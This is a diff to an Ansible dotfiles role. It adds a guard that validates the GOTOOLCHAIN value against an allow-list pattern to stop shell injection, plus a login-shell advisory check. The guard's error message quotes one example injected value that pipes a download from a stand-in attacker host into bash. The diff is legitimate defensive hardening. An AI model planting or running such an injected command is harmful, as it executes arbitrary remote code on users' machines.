@@ -37,6 +37,20 @@
       Remove any shell metacharacters from these variables.
   tags: [always]
 
+- name: Assert packages_gotoolchain matches allowed GOTOOLCHAIN values (shell injection guard)
+  vars:
+    _gotoolchain_pattern: '^(auto|local|go[0-9]+\.[0-9]+(\.[0-9]+)?)$'
+  ansible.builtin.assert:
+    that:
+      - packages_gotoolchain | string is match(_gotoolchain_pattern)
+    fail_msg: >-
+      SECURITY: packages_gotoolchain (from config.yml or -e flag) does not match the allowed
+      GOTOOLCHAIN values: 'auto', 'local', or 'goX.Y[.Z]' (e.g. go1.21.0). This value is
+      rendered unquoted into bashrc/zshrc as 'export GOTOOLCHAIN=<value>' and executed on
+      every interactive shell start. A value like 'local; curl evil.com|bash' would execute
+      arbitrary commands. Allowed values: auto, local, go1.21, go1.21.0, etc.
+  tags: [always]
+
 
 - name: Ensure user config directories exist
   ansible.builtin.file:
@@ -134,6 +148,28 @@
     state: directory
     mode: "0700"
   when: is_macos
+
+- name: Check current login shell (zsh advisory probe)
+  ansible.builtin.shell:
+    cmd: "getent passwd {{ ansible_facts['user_id'] }} | cut -d: -f7"
+  register: _dotfiles_login_shell
+  changed_when: false
+  failed_when: false
+  check_mode: false  # read-only probe — must run in check mode
+  when: is_linux
+
+- name: Warn if login shell is not zsh (zshrc will be deployed but not reached on login)
+  ansible.builtin.debug:
+    msg: >-
+      ADVISORY: .zshrc is being deployed but the current login shell is
+      '{{ _dotfiles_login_shell.stdout | trim }}' (not /bin/zsh).
+      This role intentionally does not change the login shell (that is owned by the
+      desktop role). Run 'make desktop' or 'make all' to set /bin/zsh as the login
+      shell so that .zshrc is reached on login, then log out and back in.
+  when:
+    - is_linux
+    - _dotfiles_login_shell.stdout is defined
+    - _dotfiles_login_shell.stdout | trim != '/bin/zsh'
 
 - name: Deploy zshrc
   ansible.builtin.template:
